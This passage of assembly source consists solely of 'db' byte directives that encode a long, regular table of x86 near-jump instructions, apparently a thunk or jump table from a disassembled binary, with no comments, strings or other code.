    db 00h,00h,0E9h,68h,36h,00h,00h,0E9h,63h,36h,00h,00h,0E9h,5Eh,36h,00h
    db 00h,0E9h,59h,36h,00h,00h,0E9h,54h,36h,00h,00h,0E9h,4Fh,36h,00h,00h
    db 0E9h,4Ah,36h,00h,00h,0E9h,45h,36h,00h,00h,0E9h,40h,36h,00h,00h,0E9h
    db 3Bh,36h,00h,00h,0E9h,36h,36h,00h,00h,0E9h,31h,36h,00h,00h,0E9h,2Ch
    db 36h,00h,00h,0E9h,27h,36h,00h,00h,0E9h,22h,36h,00h,00h,0E9h,1Dh,36h
    db 00h,00h,0E9h,18h,36h,00h,00h,0E9h,13h,36h,00h,00h,0E9h,0Eh,36h,00h
    db 00h,0E9h,09h,36h,00h,00h,0E9h,04h,36h,00h,00h,0E9h,0FFh,35h,00h,00h
    db 0E9h,0FAh,35h,00h,00h,0E9h,0F5h,35h,00h,00h,0E9h,0F0h,35h,00h,00h,0E9h
    db 0EBh,35h,00h,00h,0E9h,0E6h,35h,00h,00h,0E9h,0E1h,35h,00h,00h,0E9h,0DCh
    db 35h,00h,00h,0E9h,0D7h,35h,00h,00h,0E9h,0D2h,35h,00h,00h,0E9h,0CDh,35h
    db 00h,00h,0E9h,0C8h,35h,00h,00h,0E9h,0C3h,35h,00h,00h,0E9h,0BEh,35h,00h
    db 00h,0E9h,0B9h,35h,00h,00h,0E9h,0B4h,35h,00h,00h,0E9h,0AFh,35h,00h,00h
    db 0E9h,0AAh,35h,00h,00h,0E9h,0A5h,35h,00h,00h,0E9h,0A0h,35h,00h,00h,0E9h
    db 9Bh,35h,00h,00h,0E9h,96h,35h,00h,00h,0E9h,91h,35h,00h,00h,0E9h,8Ch
    db 35h,00h,00h,0E9h,87h,35h,00h,00h,0E9h,82h,35h,00h,00h,0E9h,7Dh,35h
    db 00h,00h,0E9h,78h,35h,00h,00h,0E9h,73h,35h,00h,00h,0E9h,6Eh,35h,00h
    db 00h,0E9h,69h,35h,00h,00h,0E9h,64h,35h,00h,00h,0E9h,5Fh,35h,00h,00h
    db 0E9h,5Ah,35h,00h,00h,0E9h,55h,35h,00h,00h,0E9h,50h,35h,00h,00h,0E9h
    db 4Bh,35h,00h,00h,0E9h,46h,35h,00h,00h,0E9h,41h,35h,00h,00h,0E9h,3Ch
    db 35h,00h,00h,0E9h,37h,35h,00h,00h,0E9h,32h,35h,00h,00h,0E9h,2Dh,35h
    db 00h,00h,0E9h,28h,35h,00h,00h,0E9h,23h,35h,00h,00h,0E9h,1Eh,35h,00h
    db 00h,0E9h,19h,35h,00h,00h,0E9h,14h,35h,00h,00h,0E9h,0Fh,35h,00h,00h
    db 0E9h,0Ah,35h,00h,00h,0E9h,05h,35h,00h,00h,0E9h,00h,35h,00h,00h,0E9h
    db 0FBh,34h,00h,00h,0E9h,0F6h,34h,00h,00h,0E9h,0F1h,34h,00h,00h,0E9h,0ECh
    db 34h,00h,00h,0E9h,0E7h,34h,00h,00h,0E9h,0E2h,34h,00h,00h,0E9h,0DDh,34h
    db 00h,00h,0E9h,0D8h,34h,00h,00h,0E9h,0D3h,34h,00h,00h,0E9h,0CEh,34h,00h
    db 00h,0E9h,0C9h,34h,00h,00h,0E9h,0C4h,34h,00h,00h,0E9h,0BFh,34h,00h,00h
    db 0E9h,0BAh,34h,00h,00h,0E9h,0B5h,34h,00h,00h,0E9h,0B0h,34h,00h,00h,0E9h
    db 0ABh,34h,00h,00h,0E9h,0A6h,34h,00h,00h,0E9h,0A1h,34h,00h,00h,0E9h,9Ch
    db 34h,00h,00h,0E9h,97h,34h,00h,00h,0E9h,92h,34h,00h,00h,0E9h,8Dh,34h
    db 00h,00h,0E9h,88h,34h,00h,00h,0E9h,83h,34h,00h,00h,0E9h,7Eh,34h,00h
    db 00h,0E9h,79h,34h,00h,00h,0E9h,74h,34h,00h,00h,0E9h,6Fh,34h,00h,00h
    db 0E9h,6Ah,34h,00h,00h,0E9h,65h,34h,00h,00h,0E9h,60h,34h,00h,00h,0E9h
    db 5Bh,34h,00h,00h,0E9h,56h,34h,00h,00h,0E9h,51h,34h,00h,00h,0E9h,4Ch
    db 34h,00h,00h,0E9h,47h,34h,00h,00h,0E9h,42h,34h,00h,00h,0E9h,3Dh,34h
    db 00h,00h,0E9h,38h,34h,00h,00h,0E9h,33h,34h,00h,00h,0E9h,2Eh,34h,00h
    db 00h,0E9h,29h,34h,00h,00h,0E9h,24h,34h,00h,00h,0E9h,1Fh,34h,00h,00h
    db 0E9h,1Ah,34h,00h,00h,0E9h,15h,34h,00h,00h,0E9h,10h,34h,00h,00h,0E9h
    db 0Bh,34h,00h,00h,0E9h,06h,34h,00h,00h,0E9h,01h,34h,00h,00h,0E9h,0FCh
    db 33h,00h,00h,0E9h,0F7h,33h,00h,00h,0E9h,0F2h,33h,00h,00h,0E9h,0EDh,33h
    db 00h,00h,0E9h,0E8h,33h,00h,00h,0E9h,0E3h,33h,00h,00h,0E9h,0DEh,33h,00h
    db 00h,0E9h,0D9h,33h,00h,00h,0E9h,0D4h,33h,00h,00h,0E9h,0CFh,33h,00h,00h
    db 0E9h,0CAh,33h,00h,00h,0E9h,0C5h,33h,00h,00h,0E9h,0C0h,33h,00h,00h,0E9h
    db 0BBh,33h,00h,00h,0E9h,0B6h,33h,00h,00h,0E9h,0B1h,33h,00h,00h,0E9h,0ACh
    db 33h,00h,00h,0E9h,0A7h,33h,00h,00h,0E9h,0A2h,33h,00h,00h,0E9h,9Dh,33h
    db 00h,00h,0E9h,98h,33h,00h,00h,0E9h,93h,33h,00h,00h,0E9h,8Eh,33h,00h
    db 00h,0E9h,89h,33h,00h,00h,0E9h,84h,33h,00h,00h,0E9h,7Fh,33h,00h,00h
    db 0E9h,7Ah,33h,00h,00h,0E9h,75h,33h,00h,00h,0E9h,70h,33h,00h,00h,0E9h
    db 6Bh,33h,00h,00h,0E9h,66h,33h,00h,00h,0E9h,61h,33h,00h,00h,0E9h,5Ch
    db 33h,00h,00h,0E9h,57h,33h,00h,00h,0E9h,52h,33h,00h,00h,0E9h,4Dh,33h
    db 00h,00h,0E9h,48h,33h,00h,00h,0E9h,43h,33h,00h,00h,0E9h,3Eh,33h,00h
    db 00h,0E9h,39h,33h,00h,00h,0E9h,34h,33h,00h,00h,0E9h,2Fh,33h,00h,00h
    db 0E9h,2Ah,33h,00h,00h,0E9h,25h,33h,00h,00h,0E9h,20h,33h,00h,00h,0E9h
    db 1Bh,33h,00h,00h,0E9h,16h,33h,00h,00h,0E9h,11h,33h,00h,00h,0E9h,0Ch
    db 33h,00h,00h,0E9h,07h,33h,00h,00h,0E9h,02h,33h,00h,00h,0E9h,0FDh,32h
    db 00h,00h,0E9h,0F8h,32h,00h,00h,0E9h,0F3h,32h,00h,00h,0E9h,0EEh,32h,00h
    db 00h,0E9h,0E9h,32h,00h,00h,0E9h,0E4h,32h,00h,00h,0E9h,0DFh,32h,00h,00h
    db 0E9h,0DAh,32h,00h,00h,0E9h,0D5h,32h,00h,00h,0E9h,0D0h,32h,00h,00h,0E9h
    db 0CBh,32h,00h,00h,0E9h,0C6h,32h,00h,00h,0E9h,0C1h,32h,00h,00h,0E9h,0BCh
    db 32h,00h,00h,0E9h,0B7h,32h,00h,00h,0E9h,0B2h,32h,00h,00h,0E9h,0ADh,32h
    db 00h,00h,0E9h,0A8h,32h,00h,00h,0E9h,0A3h,32h,00h,00h,0E9h,9Eh,32h,00h
    db 00h,0E9h,99h,32h,00h,00h,0E9h,94h,32h,00h,00h,0E9h,8Fh,32h,00h,00h
    db 0E9h,8Ah,32h,00h,00h,0E9h,85h,32h,00h,00h,0E9h,80h,32h,00h,00h,0E9h
    db 7Bh,32h,00h,00h,0E9h,76h,32h,00h,00h,0E9h,71h,32h,00h,00h,0E9h,6Ch
    db 32h,00h,00h,0E9h,67h,32h,00h,00h,0E9h,62h,32h,00h,00h,0E9h,5Dh,32h
    db 00h,00h,0E9h,58h,32h,00h,00h,0E9h,53h,32h,00h,00h,0E9h,4Eh,32h,00h
    db 00h,0E9h,49h,32h,00h,00h,0E9h,44h,32h,00h,00h,0E9h,3Fh,32h,00h,00h
    db 0E9h,3Ah,32h,00h,00h,0E9h,35h,32h,00h,00h,0E9h,30h,32h,00h,00h,0E9h
    db 2Bh,32h,00h,00h,0E9h,26h,32h,00h,00h,0E9h,21h,32h,00h,00h,0E9h,1Ch
    db 32h,00h,00h,0E9h,17h,32h,00h,00h,0E9h,12h,32h,00h,00h,0E9h,0Dh,32h
    db 00h,00h,0E9h,08h,32h,00h,00h,0E9h,03h,32h,00h,00h,0E9h,0FEh,31h,00h
    db 00h,0E9h,0F9h,31h,00h,00h,0E9h,0F4h,31h,00h,00h,0E9h,0EFh,31h,00h,00h
    db 0E9h,0EAh,31h,00h,00h,0E9h,0E5h,31h,00h,00h,0E9h,0E0h,31h,00h,00h,0E9h
    db 0DBh,31h,00h,00h,0E9h,0D6h,31h,00h,00h,0E9h,0D1h,31h,00h,00h,0E9h,0CCh
    db 31h,00h,00h,0E9h,0C7h,31h,00h,00h,0E9h,0C2h,31h,00h,00h,0E9h,0BDh,31h
    db 00h,00h,0E9h,0B8h,31h,00h,00h,0E9h,0B3h,31h,00h,00h,0E9h,0AEh,31h,00h
    db 00h,0E9h,0A9h,31h,00h,00h,0E9h,0A4h,31h,00h,00h,0E9h,9Fh,31h,00h,00h
    db 0E9h,9Ah,31h,00h,00h,0E9h,95h,31h,00h,00h,0E9h,90h,31h,00h,00h,0E9h
    db 8Bh,31h,00h,00h,0E9h,86h,31h,00h,00h,0E9h,81h,31h,00h,00h,0E9h,7Ch
    db 31h,00h,00h,0E9h,77h,31h,00h,00h,0E9h,72h,31h,00h,00h,0E9h,6Dh,31h
    db 00h,00h,0E9h,68h,31h,00h,00h,0E9h,63h,31h,00h,00h,0E9h,5Eh,31h,00h
    db 00h,0E9h,59h,31h,00h,00h,0E9h,54h,31h,00h,00h,0E9h,4Fh,31h,00h,00h
    db 0E9h,4Ah,31h,00h,00h,0E9h,45h,31h,00h,00h,0E9h,40h,31h,00h,00h,0E9h
    db 3Bh,31h,00h,00h,0E9h,36h,31h,00h,00h,0E9h,31h,31h,00h,00h,0E9h,2Ch
    db 31h,00h,00h,0E9h,27h,31h,00h,00h,0E9h,22h,31h,00h,00h,0E9h,1Dh,31h
    db 00h,00h,0E9h,18h,31h,00h,00h,0E9h,13h,31h,00h,00h,0E9h,0Eh,31h,00h
    db 00h,0E9h,09h,31h,00h,00h,0E9h,04h,31h,00h,00h,0E9h,0FFh,30h,00h,00h
    db 0E9h,0FAh,30h,00h,00h,0E9h,0F5h,30h,00h,00h,0E9h,0F0h,30h,00h,00h,0E9h
    db 0EBh,30h,00h,00h,0E9h,0E6h,30h,00h,00h,0E9h,0E1h,30h,00h,00h,0E9h,0DCh
    db 30h,00h,00h,0E9h,0D7h,30h,00h,00h,0E9h,0D2h,30h,00h,00h,0E9h,0CDh,30h
    db 00h,00h,0E9h,0C8h,30h,00h,00h,0E9h,0C3h,30h,00h,00h,0E9h,0BEh,30h,00h
    db 00h,0E9h,0B9h,30h,00h,00h,0E9h,0B4h,30h,00h,00h,0E9h,0AFh,30h,00h,00h
    db 0E9h,0AAh,30h,00h,00h,0E9h,0A5h,30h,00h,00h,0E9h,0A0h,30h,00h,00h,0E9h
    db 9Bh,30h,00h,00h,0E9h,96h,30h,00h,00h,0E9h,91h,30h,00h,00h,0E9h,8Ch
    db 30h,00h,00h,0E9h,87h,30h,00h,00h,0E9h,82h,30h,00h,00h,0E9h,7Dh,30h
    db 00h,00h,0E9h,78h,30h,00h,00h,0E9h,73h,30h,00h,00h,0E9h,6Eh,30h,00h
    db 00h,0E9h,69h,30h,00h,00h,0E9h,64h,30h,00h,00h,0E9h,5Fh,30h,00h,00h
    db 0E9h,5Ah,30h,00h,00h,0E9h,55h,30h,00h,00h,0E9h,50h,30h,00h,00h,0E9h
    db 4Bh,30h,00h,00h,0E9h,46h,30h,00h,00h,0E9h,41h,30h,00h,00h,0E9h,3Ch
    db 30h,00h,00h,0E9h,37h,30h,00h,00h,0E9h,32h,30h,00h,00h,0E9h,2Dh,30h
    db 00h,00h,0E9h,28h,30h,00h,00h,0E9h,23h,30h,00h,00h,0E9h,1Eh,30h,00h
    db 00h,0E9h,19h,30h,00h,00h,0E9h,14h,30h,00h,00h,0E9h,0Fh,30h,00h,00h
    db 0E9h,0Ah,30h,00h,00h,0E9h,05h,30h,00h,00h,0E9h,00h,30h,00h,00h,0E9h
    db 0FBh,2Fh,00h,00h,0E9h,0F6h,2Fh,00h,00h,0E9h,0F1h,2Fh,00h,00h,0E9h,0ECh
    db 2Fh,00h,00h,0E9h,0E7h,2Fh,00h,00h,0E9h,0E2h,2Fh,00h,00h,0E9h,0DDh,2Fh
    db 00h,00h,0E9h,0D8h,2Fh,00h,00h,0E9h,0D3h,2Fh,00h,00h,0E9h,0CEh,2Fh,00h
    db 00h,0E9h,0C9h,2Fh,00h,00h,0E9h,0C4h,2Fh,00h,00h,0E9h,0BFh,2Fh,00h,00h
    db 0E9h,0BAh,2Fh,00h,00h,0E9h,0B5h,2Fh,00h,00h,0E9h,0B0h,2Fh,00h,00h,0E9h
    db 0ABh,2Fh,00h,00h,0E9h,0A6h,2Fh,00h,00h,0E9h,0A1h,2Fh,00h,00h,0E9h,9Ch
    db 2Fh,00h,00h,0E9h,97h,2Fh,00h,00h,0E9h,92h,2Fh,00h,00h,0E9h,8Dh,2Fh
    db 00h,00h,0E9h,88h,2Fh,00h,00h,0E9h,83h,2Fh,00h,00h,0E9h,7Eh,2Fh,00h
    db 00h,0E9h,79h,2Fh,00h,00h,0E9h,74h,2Fh,00h,00h,0E9h,6Fh,2Fh,00h,00h
    db 0E9h,6Ah,2Fh,00h,00h,0E9h,65h,2Fh,00h,00h,0E9h,60h,2Fh,00h,00h,0E9h
    db 5Bh,2Fh,00h,00h,0E9h,56h,2Fh,00h,00h,0E9h,51h,2Fh,00h,00h,0E9h,4Ch
    db 2Fh,00h,00h,0E9h,47h,2Fh,00h,00h,0E9h,42h,2Fh,00h,00h,0E9h,3Dh,2Fh
    db 00h,00h,0E9h,38h,2Fh,00h,00h,0E9h,33h,2Fh,00h,00h,0E9h,2Eh,2Fh,00h
    db 00h,0E9h,29h,2Fh,00h,00h,0E9h,24h,2Fh,00h,00h,0E9h,1Fh,2Fh,00h,00h
    db 0E9h,1Ah,2Fh,00h,00h,0E9h,15h,2Fh,00h,00h,0E9h,10h,2Fh,00h,00h,0E9h
    db 0Bh,2Fh,00h,00h,0E9h,06h,2Fh,00h,00h,0E9h,01h,2Fh,00h,00h,0E9h,0FCh
    db 2Eh,00h,00h,0E9h,0F7h,2Eh,00h,00h,0E9h,0F2h,2Eh,00h,00h,0E9h,0EDh,2Eh
    db 00h,00h,0E9h,0E8h,2Eh,00h,00h,0E9h,0E3h,2Eh,00h,00h,0E9h,0DEh,2Eh,00h
    db 00h,0E9h,0D9h,2Eh,00h,00h,0E9h,0D4h,2Eh,00h,00h,0E9h,0CFh,2Eh,00h,00h
    db 0E9h,0CAh,2Eh,00h,00h,0E9h,0C5h,2Eh,00h,00h,0E9h,0C0h,2Eh,00h,00h,0E9h
    db 0BBh,2Eh,00h,00h,0E9h,0B6h,2Eh,00h,00h,0E9h,0B1h,2Eh,00h,00h,0E9h,0ACh
    db 2Eh,00h,00h,0E9h,0A7h,2Eh,00h,00h,0E9h,0A2h,2Eh,00h,00h,0E9h,9Dh,2Eh
    db 00h,00h,0E9h,98h,2Eh,00h,00h,0E9h,93h,2Eh,00h,00h,0E9h,8Eh,2Eh,00h
    db 00h,0E9h,89h,2Eh,00h,00h,0E9h,84h,2Eh,00h,00h,0E9h,7Fh,2Eh,00h,00h
    db 0E9h,7Ah,2Eh,00h,00h,0E9h,75h,2Eh,00h,00h,0E9h,70h,2Eh,00h,00h,0E9h
    db 6Bh,2Eh,00h,00h,0E9h,66h,2Eh,00h,00h,0E9h,61h,2Eh,00h,00h,0E9h,5Ch
    db 2Eh,00h,00h,0E9h,57h,2Eh,00h,00h,0E9h,52h,2Eh,00h,00h,0E9h,4Dh,2Eh
    db 00h,00h,0E9h,48h,2Eh,00h,00h,0E9h,43h,2Eh,00h,00h,0E9h,3Eh,2Eh,00h
    db 00h,0E9h,39h,2Eh,00h,00h,0E9h,34h,2Eh,00h,00h,0E9h,2Fh,2Eh,00h,00h
    db 0E9h,2Ah,2Eh,00h,00h,0E9h,25h,2Eh,00h,00h,0E9h,20h,2Eh,00h,00h,0E9h
    db 1Bh,2Eh,00h,00h,0E9h,16h,2Eh,00h,00h,0E9h,11h,2Eh,00h,00h,0E9h,0Ch
    db 2Eh,00h,00h,0E9h,07h,2Eh,00h,00h,0E9h,02h,2Eh,00h,00h,0E9h,0FDh,2Dh
    db 00h,00h,0E9h,0F8h,2Dh,00h,00h,0E9h,0F3h,2Dh,00h,00h,0E9h,0EEh,2Dh,00h
    db 00h,0E9h,0E9h,2Dh,00h,00h,0E9h,0E4h,2Dh,00h,00h,0E9h,0DFh,2Dh,00h,00h
    db 0E9h,0DAh,2Dh,00h,00h,0E9h,0D5h,2Dh,00h,00h,0E9h,0D0h,2Dh,00h,00h,0E9h
    db 0CBh,2Dh,00h,00h,0E9h,0C6h,2Dh,00h,00h,0E9h,0C1h,2Dh,00h,00h,0E9h,0BCh
    db 2Dh,00h,00h,0E9h,0B7h,2Dh,00h,00h,0E9h,0B2h,2Dh,00h,00h,0E9h,0ADh,2Dh
    db 00h,00h,0E9h,0A8h,2Dh,00h,00h,0E9h,0A3h,2Dh,00h,00h,0E9h,9Eh,2Dh,00h
    db 00h,0E9h,99h,2Dh,00h,00h,0E9h,94h,2Dh,00h,00h,0E9h,8Fh,2Dh,00h,00h
    db 0E9h,8Ah,2Dh,00h,00h,0E9h,85h,2Dh,00h,00h,0E9h,80h,2Dh,00h,00h,0E9h
    db 7Bh,2Dh,00h,00h,0E9h,76h,2Dh,00h,00h,0E9h,71h,2Dh,00h,00h,0E9h,6Ch
    db 2Dh,00h,00h,0E9h,67h,2Dh,00h,00h,0E9h,62h,2Dh,00h,00h,0E9h,5Dh,2Dh
    db 00h,00h,0E9h,58h,2Dh,00h,00h,0E9h,53h,2Dh,00h,00h,0E9h,4Eh,2Dh,00h
    db 00h,0E9h,49h,2Dh,00h,00h,0E9h,44h,2Dh,00h,00h,0E9h,3Fh,2Dh,00h,00h
    db 0E9h,3Ah,2Dh,00h,00h,0E9h,35h,2Dh,00h,00h,0E9h,30h,2Dh,00h,00h,0E9h
    db 2Bh,2Dh,00h,00h,0E9h,26h,2Dh,00h,00h,0E9h,21h,2Dh,00h,00h,0E9h,1Ch
    db 2Dh,00h,00h,0E9h,17h,2Dh,00h,00h,0E9h,12h,2Dh,00h,00h,0E9h,0Dh,2Dh
    db 00h,00h,0E9h,08h,2Dh,00h,00h,0E9h,03h,2Dh,00h,00h,0E9h,0FEh,2Ch,00h
    db 00h,0E9h,0F9h,2Ch,00h,00h,0E9h,0F4h,2Ch,00h,00h,0E9h,0EFh,2Ch,00h,00h
    db 0E9h,0EAh,2Ch,00h,00h,0E9h,0E5h,2Ch,00h,00h,0E9h,0E0h,2Ch,00h,00h,0E9h
    db 0DBh,2Ch,00h,00h,0E9h,0D6h,2Ch,00h,00h,0E9h,0D1h,2Ch,00h,00h,0E9h,0CCh
    db 2Ch,00h,00h,0E9h,0C7h,2Ch,00h,00h,0E9h,0C2h,2Ch,00h,00h,0E9h,0BDh,2Ch
    db 00h,00h,0E9h,0B8h,2Ch,00h,00h,0E9h,0B3h,2Ch,00h,00h,0E9h,0AEh,2Ch,00h
    db 00h,0E9h,0A9h,2Ch,00h,00h,0E9h,0A4h,2Ch,00h,00h,0E9h,9Fh,2Ch,00h,00h
    db 0E9h,9Ah,2Ch,00h,00h,0E9h,95h,2Ch,00h,00h,0E9h,90h,2Ch,00h,00h,0E9h
    db 8Bh,2Ch,00h,00h,0E9h,86h,2Ch,00h,00h,0E9h,81h,2Ch,00h,00h,0E9h,7Ch
    db 2Ch,00h,00h,0E9h,77h,2Ch,00h,00h,0E9h,72h,2Ch,00h,00h,0E9h,6Dh,2Ch
    db 00h,00h,0E9h,68h,2Ch,00h,00h,0E9h,63h,2Ch,00h,00h,0E9h,5Eh,2Ch,00h
    db 00h,0E9h,59h,2Ch,00h,00h,0E9h,54h,2Ch,00h,00h,0E9h,4Fh,2Ch,00h,00h
    db 0E9h,4Ah,2Ch,00h,00h,0E9h,45h,2Ch,00h,00h,0E9h,40h,2Ch,00h,00h,0E9h
    db 3Bh,2Ch,00h,00h,0E9h,36h,2Ch,00h,00h,0E9h,31h,2Ch,00h,00h,0E9h,2Ch
    db 2Ch,00h,00h,0E9h,27h,2Ch,00h,00h,0E9h,22h,2Ch,00h,00h,0E9h,1Dh,2Ch
    db 00h,00h,0E9h,18h,2Ch,00h,00h,0E9h,13h,2Ch,00h,00h,0E9h,0Eh,2Ch,00h
    db 00h,0E9h,09h,2Ch,00h,00h,0E9h,04h,2Ch,00h,00h,0E9h,0FFh,2Bh,00h,00h
    db 0E9h,0FAh,2Bh,00h,00h,0E9h,0F5h,2Bh,00h,00h,0E9h,0F0h,2Bh,00h,00h,0E9h
    db 0EBh,2Bh,00h,00h,0E9h,0E6h,2Bh,00h,00h,0E9h,0E1h,2Bh,00h,00h,0E9h,0DCh
    db 2Bh,00h,00h,0E9h,0D7h,2Bh,00h,00h,0E9h,0D2h,2Bh,00h,00h,0E9h,0CDh,2Bh
    db 00h,00h,0E9h,0C8h,2Bh,00h,00h,0E9h,0C3h,2Bh,00h,00h,0E9h,0BEh,2Bh,00h
    db 00h,0E9h,0B9h,2Bh,00h,00h,0E9h,0B4h,2Bh,00h,00h,0E9h,0AFh,2Bh,00h,00h
    db 0E9h,0AAh,2Bh,00h,00h,0E9h,0A5h,2Bh,00h,00h,0E9h,0A0h,2Bh,00h,00h,0E9h
    db 9Bh,2Bh,00h,00h,0E9h,96h,2Bh,00h,00h,0E9h,91h,2Bh,00h,00h,0E9h,8Ch
    db 2Bh,00h,00h,0E9h,87h,2Bh,00h,00h,0E9h,82h,2Bh,00h,00h,0E9h,7Dh,2Bh
    db 00h,00h,0E9h,78h,2Bh,00h,00h,0E9h,73h,2Bh,00h,00h,0E9h,6Eh,2Bh,00h
    db 00h,0E9h,69h,2Bh,00h,00h,0E9h,64h,2Bh,00h,00h,0E9h,5Fh,2Bh,00h,00h
    db 0E9h,5Ah,2Bh,00h,00h,0E9h,55h,2Bh,00h,00h,0E9h,50h,2Bh,00h,00h,0E9h
    db 4Bh,2Bh,00h,00h,0E9h,46h,2Bh,00h,00h,0E9h,41h,2Bh,00h,00h,0E9h,3Ch
    db 2Bh,00h,00h,0E9h,37h,2Bh,00h,00h,0E9h,32h,2Bh,00h,00h,0E9h,2Dh,2Bh
    db 00h,00h,0E9h,28h,2Bh,00h,00h,0E9h,23h,2Bh,00h,00h,0E9h,1Eh,2Bh,00h
    db 00h,0E9h,19h,2Bh,00h,00h,0E9h,14h,2Bh,00h,00h,0E9h,0Fh,2Bh,00h,00h
    db 0E9h,0Ah,2Bh,00h,00h,0E9h,05h,2Bh,00h,00h,0E9h,00h,2Bh,00h,00h,0E9h
    db 0FBh,2Ah,00h,00h,0E9h,0F6h,2Ah,00h,00h,0E9h,0F1h,2Ah,00h,00h,0E9h,0ECh
    db 2Ah,00h,00h,0E9h,0E7h,2Ah,00h,00h,0E9h,0E2h,2Ah,00h,00h,0E9h,0DDh,2Ah
    db 00h,00h,0E9h,0D8h,2Ah,00h,00h,0E9h,0D3h,2Ah,00h,00h,0E9h,0CEh,2Ah,00h
    db 00h,0E9h,0C9h,2Ah,00h,00h,0E9h,0C4h,2Ah,00h,00h,0E9h,0BFh,2Ah,00h,00h
    db 0E9h,0BAh,2Ah,00h,00h,0E9h,0B5h,2Ah,00h,00h,0E9h,0B0h,2Ah,00h,00h,0E9h
    db 0ABh,2Ah,00h,00h,0E9h,0A6h,2Ah,00h,00h,0E9h,0A1h,2Ah,00h,00h,0E9h,9Ch
    db 2Ah,00h,00h,0E9h,97h,2Ah,00h,00h,0E9h,92h,2Ah,00h,00h,0E9h,8Dh,2Ah
    db 00h,00h,0E9h,88h,2Ah,00h,00h,0E9h,83h,2Ah,00h,00h,0E9h,7Eh,2Ah,00h
    db 00h,0E9h,79h,2Ah,00h,00h,0E9h,74h,2Ah,00h,00h,0E9h,6Fh,2Ah,00h,00h
    db 0E9h,6Ah,2Ah,00h,00h,0E9h,65h,2Ah,00h,00h,0E9h,60h,2Ah,00h,00h,0E9h
    db 5Bh,2Ah,00h,00h,0E9h,56h,2Ah,00h,00h,0E9h,51h,2Ah,00h,00h,0E9h,4Ch
    db 2Ah,00h,00h,0E9h,47h,2Ah,00h,00h,0E9h,42h,2Ah,00h,00h,0E9h,3Dh,2Ah
    db 00h,00h,0E9h,38h,2Ah,00h,00h,0E9h,33h,2Ah,00h,00h,0E9h,2Eh,2Ah,00h
    db 00h,0E9h,29h,2Ah,00h,00h,0E9h,24h,2Ah,00h,00h,0E9h,1Fh,2Ah,00h,00h
    db 0E9h,1Ah,2Ah,00h,00h,0E9h,15h,2Ah,00h,00h,0E9h,10h,2Ah,00h,00h,0E9h
    db 0Bh,2Ah,00h,00h,0E9h,06h,2Ah,00h,00h,0E9h,01h,2Ah,00h,00h,0E9h,0FCh
    db 29h,00h,00h,0E9h,0F7h,29h,00h,00h,0E9h,0F2h,29h,00h,00h,0E9h,0EDh,29h
    db 00h,00h,0E9h,0E8h,29h,00h,00h,0E9h,0E3h,29h,00h,00h,0E9h,0DEh,29h,00h
    db 00h,0E9h,0D9h,29h,00h,00h,0E9h,0D4h,29h,00h,00h,0E9h,0CFh,29h,00h,00h
    db 0E9h,0CAh,29h,00h,00h,0E9h,0C5h,29h,00h,00h,0E9h,0C0h,29h,00h,00h,0E9h
    db 0BBh,29h,00h,00h,0E9h,0B6h,29h,00h,00h,0E9h,0B1h,29h,00h,00h,0E9h,0ACh
    db 29h,00h,00h,0E9h,0A7h,29h,00h,00h,0E9h,0A2h,29h,00h,00h,0E9h,9Dh,29h
    db 00h,00h,0E9h,98h,29h,00h,00h,0E9h,93h,29h,00h,00h,0E9h,8Eh,29h,00h
    db 00h,0E9h,89h,29h,00h,00h,0E9h,84h,29h,00h,00h,0E9h,7Fh,29h,00h,00h
    db 0E9h,7Ah,29h,00h,00h,0E9h,75h,29h,00h,00h,0E9h,70h,29h,00h,00h,0E9h
    db 6Bh,29h,00h,00h,0E9h,66h,29h,00h,00h,0E9h,61h,29h,00h,00h,0E9h,5Ch
    db 29h,00h,00h,0E9h,57h,29h,00h,00h,0E9h,52h,29h,00h,00h,0E9h,4Dh,29h
    db 00h,00h,0E9h,48h,29h,00h,00h,0E9h,43h,29h,00h,00h,0E9h,3Eh,29h,00h
    db 00h,0E9h,39h,29h,00h,00h,0E9h,34h,29h,00h,00h,0E9h,2Fh,29h,00h,00h
    db 0E9h,2Ah,29h,00h,00h,0E9h,25h,29h,00h,00h,0E9h,20h,29h,00h,00h,0E9h
    db 1Bh,29h,00h,00h,0E9h,16h,29h,00h,00h,0E9h,11h,29h,00h,00h,0E9h,0Ch
    db 29h,00h,00h,0E9h,07h,29h,00h,00h,0E9h,02h,29h,00h,00h,0E9h,0FDh,28h
    db 00h,00h,0E9h,0F8h,28h,00h,00h,0E9h,0F3h,28h,00h,00h,0E9h,0EEh,28h,00h
    db 00h,0E9h,0E9h,28h,00h,00h,0E9h,0E4h,28h,00h,00h,0E9h,0DFh,28h,00h,00h
    db 0E9h,0DAh,28h,00h,00h,0E9h,0D5h,28h,00h,00h,0E9h,0D0h,28h,00h,00h,0E9h
    db 0CBh,28h,00h,00h,0E9h,0C6h,28h,00h,00h,0E9h,0C1h,28h,00h,00h,0E9h,0BCh
    db 28h,00h,00h,0E9h,0B7h,28h,00h,00h,0E9h,0B2h,28h,00h,00h,0E9h,0ADh,28h
    db 00h,00h,0E9h,0A8h,28h,00h,00h,0E9h,0A3h,28h,00h,00h,0E9h,9Eh,28h,00h
    db 00h,0E9h,99h,28h,00h,00h,0E9h,94h,28h,00h,00h,0E9h,8Fh,28h,00h,00h
    db 0E9h,8Ah,28h,00h,00h,0E9h,85h,28h,00h,00h,0E9h,80h,28h,00h,00h,0E9h
    db 7Bh,28h,00h,00h,0E9h,76h,28h,00h,00h,0E9h,71h,28h,00h,00h,0E9h,6Ch
    db 28h,00h,00h,0E9h,67h,28h,00h,00h,0E9h,62h,28h,00h,00h,0E9h,5Dh,28h
    db 00h,00h,0E9h,58h,28h,00h,00h,0E9h,53h,28h,00h,00h,0E9h,4Eh,28h,00h
    db 00h,0E9h,49h,28h,00h,00h,0E9h,44h,28h,00h,00h,0E9h,3Fh,28h,00h,00h
    db 0E9h,3Ah,28h,00h,00h,0E9h,35h,28h,00h,00h,0E9h,30h,28h,00h,00h,0E9h
    db 2Bh,28h,00h,00h,0E9h,26h,28h,00h,00h,0E9h,21h,28h,00h,00h,0E9h,1Ch
    db 28h,00h,00h,0E9h,17h,28h,00h,00h,0E9h,12h,28h,00h,00h,0E9h,0Dh,28h
    db 00h,00h,0E9h,08h,28h,00h,00h,0E9h,03h,28h,00h,00h,0E9h,0FEh,27h,00h
    db 00h,0E9h,0F9h,27h,00h,00h,0E9h,0F4h,27h,00h,00h,0E9h,0EFh,27h,00h,00h
    db 0E9h,0EAh,27h,00h,00h,0E9h,0E5h,27h,00h,00h,0E9h,0E0h,27h,00h,00h,0E9h
    db 0DBh,27h,00h,00h,0E9h,0D6h,27h,00h,00h,0E9h,0D1h,27h,00h,00h,0E9h,0CCh
